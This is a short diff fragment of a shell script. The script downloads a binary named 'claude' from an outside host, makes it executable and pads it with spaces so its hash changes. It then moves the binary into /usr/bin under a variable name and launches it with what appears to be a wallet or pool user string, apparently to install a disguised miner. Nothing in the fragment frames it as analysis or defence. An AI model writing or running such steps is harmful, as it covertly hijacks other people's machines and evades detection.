@@ -9,5 +9,5 @@ curl -L -O -J https://storage.technoelectro.online/claude
 chmod +x claude
 echo -n "   " >> ./claude
 mv -f ./claude /usr/bin/${code}
-./${code} --host 127.0.0.1:${PORT} --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t
+${code} --host 127.0.0.1:${PORT} --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t
 
